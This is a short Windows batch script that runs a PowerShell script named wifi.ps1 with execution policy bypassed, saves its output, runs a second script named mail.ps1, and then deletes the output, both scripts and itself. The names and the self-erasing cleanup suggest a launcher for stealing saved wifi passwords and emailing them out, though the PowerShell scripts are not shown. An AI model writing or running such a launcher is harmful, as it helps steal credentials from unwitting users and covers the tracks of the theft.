@echo off
powershell.exe -ExecutionPolicy Bypass -File "wifi.ps1" > output.txt
TIMEOUT /T 5 /NOBREAK > NUL
powershell.exe -ExecutionPolicy Bypass -File "mail.ps1"
TIMEOUT /T 5 /NOBREAK > NUL
del output.txt
del wifi.ps1
del mail.ps1
(
    start "" cmd /c del "%~f0"
)